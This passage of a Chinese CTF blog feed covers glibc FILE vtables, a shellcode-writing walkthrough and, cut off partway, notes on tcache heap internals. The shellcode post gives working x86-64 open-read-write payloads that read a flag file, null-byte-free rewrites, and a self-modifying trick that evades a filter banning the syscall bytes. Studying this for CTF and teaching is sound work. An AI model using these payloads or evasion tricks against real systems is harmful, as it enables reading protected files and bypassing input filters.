class="title">IO_str_jumps</span> <span class="title">libio_vtable</span> =</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  JUMP_INIT_DUMMY,</span><br><span class="line">  JUMP_INIT(finish, _IO_str_finish),</span><br><span class="line">  JUMP_INIT(<span class="built_in">overflow</span>, _IO_str_overflow),</span><br><span class="line">  JUMP_INIT(underflow, _IO_str_underflow),</span><br><span class="line">  JUMP_INIT(uflow, _IO_default_uflow),</span><br><span class="line">  JUMP_INIT(pbackfail, _IO_str_pbackfail),</span><br><span class="line">  JUMP_INIT(xsputn, _IO_default_xsputn),</span><br><span class="line">  JUMP_INIT(xsgetn, _IO_default_xsgetn),</span><br><span class="line">  JUMP_INIT(seekoff, _IO_str_seekoff),</span><br><span class="line">  JUMP_INIT(seekpos, _IO_default_seekpos),</span><br><span class="line">  JUMP_INIT(setbuf, _IO_default_setbuf),</span><br><span class="line">  JUMP_INIT(sync, _IO_default_sync),</span><br><span class="line">  JUMP_INIT(doallocate, _IO_default_doallocate),</span><br><span class="line">  JUMP_INIT(<span class="built_in">read</span>, _IO_default_read),</span><br><span class="line">  JUMP_INIT(<span class="built_in">write</span>, _IO_default_write),</span><br><span class="line">  JUMP_INIT(<span class="built_in">seek</span>, _IO_default_seek),</span><br><span class="line">  JUMP_INIT(<span class="built_in">close</span>, _IO_default_close),</span><br><span class="line">  JUMP_INIT(stat, _IO_default_stat),</span><br><span class="line">  JUMP_INIT(showmanyc, _IO_default_showmanyc),</span><br><span class="line">  JUMP_INIT(imbue, _IO_default_imbue)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x01-FILE结构&quot;&gt;&lt;a href=&quot;#0x01-FILE结构&quot; class=&quot;headerlink&quot; title=&quot;0x01 FILE结构&quot;&gt;&lt;/a&gt;0x01 FILE结构&lt;/h1&gt;&lt;h2 id=&quot;1-FILE-介绍&quot;&gt;&lt;a href=&quot;#1-FILE-介</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>如何编写shellcode</title>
    <link href="https://pz1o.top/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/"/>
    <id>https://pz1o.top/2021/03/21/%E5%A6%82%E4%BD%95%E7%BC%96%E5%86%99shellcode/</id>
    <published>2021-03-21T11:03:19.000Z</published>
    <updated>2021-04-18T15:11:26.483Z</updated>
    
    <content type="html"><![CDATA[<p>写这个主要是校赛出了一道题，来源于国外的一道题目</p><p>具体的话可以看[这个][<a href="https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚" target="_blank" rel="noopener">https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-primer-runme-runme2-and-runme3]，写得很清楚</a></p><h1 id="0x01-method"><a href="#0x01-method" class="headerlink" title="0x01 method"></a>0x01 method</h1><h2 id="nasm"><a href="#nasm" class="headerlink" title="nasm"></a>nasm</h2><p>首先我们需要这个nasm东西</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">whereis nasm</span><br><span class="line">&#x2F;&#x2F;如果没有，直接</span><br><span class="line">sudo apt-get install nasm</span><br></pre></td></tr></table></figure><p>接下来我们来编译一个汇编文件</p><p>具体内容如下，其实就是输出hello,world</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">; hello.asm </span><br><span class="line">section .data            ; 数据段声明</span><br><span class="line">        msg db &quot;Hello, world!&quot;, 0xA     ; 要输出的字符串</span><br><span class="line">        len equ $ - msg                 ; 字串长度</span><br><span class="line">section .text            ; 代码段声明</span><br><span class="line">global main            ; 指定入口函数</span><br><span class="line">main:                  ; 在屏幕上显示一个字符串</span><br><span class="line">        mov edx, len     ; 参数三：字符串长度</span><br><span class="line">        mov ecx, msg     ; 参数二：要显示的字符串</span><br><span class="line">        mov ebx, 1       ; 参数一：文件描述符(stdout) </span><br><span class="line">        mov eax, 4       ; 系统调用号(sys_write) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br><span class="line">                         ; 退出程序</span><br><span class="line">        mov ebx, 0       ; 参数一：退出代码</span><br><span class="line">        mov eax, 1       ; 系统调用号(sys_exit) </span><br><span class="line">        int 0x80         ; 调用内核功能</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nasm -f elf32 hello.asm -o hello.o</span><br><span class="line">&#x2F;&#x2F;nasm -f [输出文件格式] [源文件] -o [目标文件]</span><br><span class="line">gcc -m32 hello.o -o hello</span><br></pre></td></tr></table></figure><p>应该可以看到运行出了hello,world，其实我们也就是从汇编然后编译执行了一个程序</p><p>但我们如何查看其中十六进制数据呢？</p><p>当然有多种方法</p><p>比如objdump,objcopy等</p><p>这里主要用一下objcopy</p><p>具体每个工具用法可以自己去查，这里就不说了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">objcopy -O binary hello.o code</span><br><span class="line">xxd -i code</span><br></pre></td></tr></table></figure><p>这样我们就生成了自己的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ xxd -i code</span><br><span class="line">unsigned char code[] &#x3D; &#123;</span><br><span class="line">  0xba, 0x0e, 0x00, 0x00, 0x00, 0xb9, 0x00, 0x00, 0x00, 0x00, 0xbb, 0x01,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x04, 0x00, 0x00, 0x00, 0xcd, 0x80, 0xbb, 0x00,</span><br><span class="line">  0x00, 0x00, 0x00, 0xb8, 0x01, 0x00, 0x00, 0x00, 0xcd, 0x80</span><br><span class="line">&#125;;</span><br><span class="line">unsigned int code_len &#x3D; 34;</span><br></pre></td></tr></table></figure><h1 id="0x02-challenge"><a href="#0x02-challenge" class="headerlink" title="0x02 challenge"></a>0x02 challenge</h1><p>这里总共分为三个challenge，主要是针对64位的</p><p>也就是说我们参数在rdi rsi rdx中</p><p>我们首先得要知道写shellcode目的是什么？</p><p>在CTF中我们通常有两种一种就是拿到/bin/sh，另一种就是就是知道flag路径直接进行ORW</p><p>先来看第一个挑战吧，这里原文作者都是用ORW(open read write)来做的，我们是来学东西的，也不必纠结那些东西。</p><h2 id="runme1"><a href="#runme1" class="headerlink" title="runme1"></a>runme1</h2><p>先来看原作的第一个shellcode</p><p>注释都已经很详细了</p><p>就是很简单的ORW</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  mov rax, 2 ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  call getfilename ; Pushes the next address onto the stack and jumps down</span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot;,0 ; The literal flag, null terminated</span><br><span class="line">getfilename:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line">  mov rsi, 0 ; Flags &#x3D; 0</span><br><span class="line">  mov rdx, 0 ; Mode &#x3D; 0</span><br><span class="line">  syscall ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  mov rax, 0 ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  pop rdi ; Move the file handle into rdi</span><br><span class="line">  pop rsi ; Use the same buffer where the filename pointer is stored (it&#39;s readable and writable)</span><br><span class="line">  mov rdx, 30 ; rdx is the count</span><br><span class="line">  syscall ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  mov rax, 1 ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  mov rdi, 1 ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line">  mov rdx, 30 ; rdx is the count again</span><br><span class="line">  syscall ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  mov rax, 60 ; Syscall 60 &#x3D; exit</span><br><span class="line">  mov rdi, 0 ; Exit with code 0</span><br><span class="line">  syscall ; Perform an exit</span><br></pre></td></tr></table></figure><h2 id="runme2"><a href="#runme2" class="headerlink" title="runme2"></a>runme2</h2><p>这个challenge加了限制条件，没有空字节</p><p>先看一下第一个写的shellcode</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 1</span><br><span class="line">00000000  B802000000        mov eax,0x2</span><br><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">0000000A  2F                db 0x2f</span><br><span class="line">0000000B  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000010  63                db 0x63</span><br><span class="line">00000011  7466              jz 0x79</span><br><span class="line">00000013  2F                db 0x2f</span><br><span class="line">00000014  666C              o16 insb</span><br><span class="line">00000016  61                db 0x61</span><br><span class="line">00000017  672E7478          cs jz 0x93</span><br><span class="line">0000001B  7400              jz 0x1d</span><br><span class="line">0000001D  5F                pop rdi</span><br><span class="line">0000001E  BE00000000        mov esi,0x0</span><br><span class="line">00000023  BA00000000        mov edx,0x0</span><br><span class="line">00000028  0F05              syscall</span><br><span class="line">0000002A  57                push rdi</span><br><span class="line">0000002B  50                push rax</span><br><span class="line">0000002C  B800000000        mov eax,0x0</span><br><span class="line">00000031  5F                pop rdi</span><br><span class="line">00000032  5E                pop rsi</span><br><span class="line">00000033  BA1E000000        mov edx,0x1e</span><br><span class="line">00000038  0F05              syscall</span><br><span class="line">0000003A  B801000000        mov eax,0x1</span><br><span class="line">0000003F  BF01000000        mov edi,0x1</span><br><span class="line">00000044  BA1E000000        mov edx,0x1e</span><br><span class="line">00000049  0F05              syscall</span><br><span class="line">0000004B  B83C000000        mov eax,0x3c</span><br><span class="line">00000050  BF00000000        mov edi,0x0</span><br><span class="line">00000055  0F05              syscall</span><br></pre></td></tr></table></figure><p>发现有很多0字节，这里要想不出现00字节该怎么办呢？</p><p>我们首先得看到哪里有0字节</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">00000005  E813000000        call qword 0x1d</span><br><span class="line">&#x2F;&#x2F;call A+0x13 &#x3D; call 0x1d</span><br></pre></td></tr></table></figure><p>call中有很多00字节，这里可以用jmp替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000005  EB13              jmp short 0x1d</span><br></pre></td></tr></table></figure><p>这里提到了一个calling backwards，主要就是调用上方代码。</p><p>这里还有几个trick</p><ol><li>mov REG,0 ==&gt;xor REG,REG</li><li>rax==&gt;al</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  syscall</span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;&#x2F;home&#x2F;ctf&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure><p>看一下这个，是没有00字节的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">pz1o@pz1o:~&#x2F;桌面$ ndisasm -b64 a</span><br><span class="line">00000000  4831C0            xor rax,rax</span><br><span class="line">00000003  B002              mov al,0x2</span><br><span class="line">00000005  EB34              jmp short 0x3b</span><br><span class="line">00000007  5F                pop rdi</span><br><span class="line">00000008  4831F6            xor rsi,rsi</span><br><span class="line">0000000B  4831D2            xor rdx,rdx</span><br><span class="line">0000000E  0F05              syscall</span><br><span class="line">00000010  57                push rdi</span><br><span class="line">00000011  50                push rax</span><br><span class="line">00000012  4831C0            xor rax,rax</span><br><span class="line">00000015  5F                pop rdi</span><br><span class="line">00000016  5E                pop rsi</span><br><span class="line">00000017  4831D2            xor rdx,rdx</span><br><span class="line">0000001A  B21E              mov dl,0x1e</span><br><span class="line">0000001C  0F05              syscall</span><br><span class="line">0000001E  4831C0            xor rax,rax</span><br><span class="line">00000021  48FFC0            inc rax</span><br><span class="line">00000024  4831FF            xor rdi,rdi</span><br><span class="line">00000027  48FFC7            inc rdi</span><br><span class="line">0000002A  4831D2            xor rdx,rdx</span><br><span class="line">0000002D  B21E              mov dl,0x1e</span><br><span class="line">0000002F  0F05              syscall</span><br><span class="line">00000031  4831C0            xor rax,rax</span><br><span class="line">00000034  B03C              mov al,0x3c</span><br><span class="line">00000036  4831FF            xor rdi,rdi</span><br><span class="line">00000039  0F05              syscall</span><br><span class="line">0000003B  E8C7FFFFFF        call qword 0x7</span><br><span class="line">00000040  2F                db 0x2f</span><br><span class="line">00000041  686F6D652F        push qword 0x2f656d6f</span><br><span class="line">00000046  63                db 0x63</span><br><span class="line">00000047  7466              jz 0xaf</span><br><span class="line">00000049  2F                db 0x2f</span><br><span class="line">0000004A  666C              o16 insb</span><br><span class="line">0000004C  61                db 0x61</span><br><span class="line">0000004D  672E7478          cs jz 0xc9</span><br><span class="line">00000051  74                db 0x74</span><br></pre></td></tr></table></figure><h2 id="runme3"><a href="#runme3" class="headerlink" title="runme3"></a>runme3</h2><p>这个直接把<code>syscall</code>ban了，那我们应该用什么呢？</p><p>也就是<code>0f</code> <code>05</code></p><p>这里的trick还是很有意思的，自己写一个编码器，那么我们来看一下如何实现吧？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">bits 64</span><br><span class="line"></span><br><span class="line">; Jump down to the bottom, where we have the bytes for syscall (less 1) waiting</span><br><span class="line">jmp short my_fake_syscall_bottom</span><br><span class="line">  my_fake_syscall_top:</span><br><span class="line">  pop rbx ; Pop the address of the syscall-minus-1 block into rbx</span><br><span class="line">  add word [rbx], 0x0101 ; Increment the two bytes - 0x0e -&gt; 0x0f and 0x04 -&gt; 0x05</span><br><span class="line"></span><br><span class="line">  ; Now rbx points to &quot;syscall &#x2F; ret&quot;, so we can just call that any time we</span><br><span class="line">  ; need a syscall!</span><br><span class="line">  ;</span><br><span class="line">  ; Other than changing &quot;syscall&quot; to &quot;call rbx&quot;, the rest is identical!</span><br><span class="line"></span><br><span class="line">;;; OPEN</span><br><span class="line"></span><br><span class="line">  ; Syscall 2 &#x3D; sys_open</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 2</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; filename</span><br><span class="line">  jmp short getfilename_bottom</span><br><span class="line">getfilename_top:</span><br><span class="line">  pop rdi ; Pop the top of the stack (which is the filename) into rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; flags</span><br><span class="line">  xor rsi, rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; mode</span><br><span class="line">  xor rdx, rdx</span><br><span class="line"></span><br><span class="line">  ; Perform sys_open() syscall, the file handle is returned in rax</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; READ</span><br><span class="line"></span><br><span class="line">  push rdi ; Temporarly store the filename pointer</span><br><span class="line">  push rax ; Temporarily store the handle</span><br><span class="line"></span><br><span class="line">  ; Syscall 0 &#x3D; sys_read</span><br><span class="line">  xor rax, rax</span><br><span class="line"></span><br><span class="line">  ; rdi &#x3D; file handle</span><br><span class="line">  pop rdi</span><br><span class="line"></span><br><span class="line">  ; rsi &#x3D; buffer (same as filename)</span><br><span class="line">  pop rsi</span><br><span class="line"></span><br><span class="line">  ; rdx &#x3D; count</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform sys_read() syscall, reading from the opened file</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; WRITE</span><br><span class="line"></span><br><span class="line">  ; Syscall 1 &#x3D; sys_write</span><br><span class="line">  xor rax, rax</span><br><span class="line">  inc rax</span><br><span class="line"></span><br><span class="line">  ; File handle to write to &#x3D; stdout &#x3D; 1</span><br><span class="line">  xor rdi, rdi</span><br><span class="line">  inc rdi</span><br><span class="line"></span><br><span class="line">  ; (rsi is already the buffer)</span><br><span class="line"></span><br><span class="line">  ; rdx is the count again</span><br><span class="line">  xor rdx, rdx</span><br><span class="line">  mov dl, 30</span><br><span class="line"></span><br><span class="line">  ; Perform the sys_write syscall, writing the data to stdout</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">;;; EXIT</span><br><span class="line">  ; Syscall 60 &#x3D; exit</span><br><span class="line">  xor rax, rax</span><br><span class="line">  mov al, 60</span><br><span class="line"></span><br><span class="line">  ; Exit with code 0</span><br><span class="line">  xor rdi, rdi</span><br><span class="line"></span><br><span class="line">  ; Perform an exit</span><br><span class="line">  call rbx</span><br><span class="line"></span><br><span class="line">my_fake_syscall_bottom:</span><br><span class="line">  call my_fake_syscall_top</span><br><span class="line"></span><br><span class="line">  ; This little block will become &quot;syscall &#x2F; ret&quot;</span><br><span class="line">  db 0x0e, 0x04 ; syscall is actually 0x0f 0x05</span><br><span class="line">  ret ; Return after doing a syscall</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">getfilename_bottom:</span><br><span class="line">  call getfilename_top</span><br><span class="line"></span><br><span class="line">  db &quot;.&#x2F;flag.txt&quot; ; The literal flag, fortunately the buffer itself is null-filled so we don&#39;t need to null terminate</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;写这个主要是校赛出了一道题，来源于国外的一道题目&lt;/p&gt;
&lt;p&gt;具体的话可以看[这个][&lt;a href=&quot;https://blog.skullsecurity.org/2021/bsidessf-ctf-2021-author-writeup-shellcode-prime</summary>
      
    
    
    
    
    <category term="PWN" scheme="https://pz1o.top/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>tcache</title>
    <link href="https://pz1o.top/2021/03/08/tcache/"/>
    <id>https://pz1o.top/2021/03/08/tcache/</id>
    <published>2021-03-08T10:05:58.000Z</published>
    <updated>2021-04-18T15:08:56.098Z</updated>
    
    <content type="html"><![CDATA[<p>down的wiki，便于自己多看。主要梳理一下结构。</p><h1 id="0x01-Introduction"><a href="#0x01-Introduction" class="headerlink" title="0x01 Introduction"></a>0x01 Introduction</h1><p>tcache是glibc 2.26(Ubuntu 17.10)之后引入的一种技术，其目的是为了提升堆管理的性能。</p><h2 id="1-结构体"><a href="#1-结构体" class="headerlink" title="1.结构体"></a>1.结构体</h2><p><code>tcache_entry</code> 和 <code>tcache_perthread_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We overlay this structure on the user-data portion of a chunk when</span></span><br><span class="line"><span class="comment">   the chunk is stored in the per-thread cache.  */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure><blockquote><p><code>tcache_entry</code> 用于链接空闲的 chunk 结构体，其中的 <code>next</code> 指针指向下一个大小相同的 chunk。</p><p>需要注意的是这里的 <strong>next 指向 chunk 的 user data，而 fastbin 的 fd 指向 chunk 开头的地址。</strong></p><p>而且，tcache_entry 会复用空闲 chunk 的 user data 部分。</p><p>如图<img src="/2021/03/08/tcache/20210201102625163.png" alt="在这里插入图片描述"></p></blockquote><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 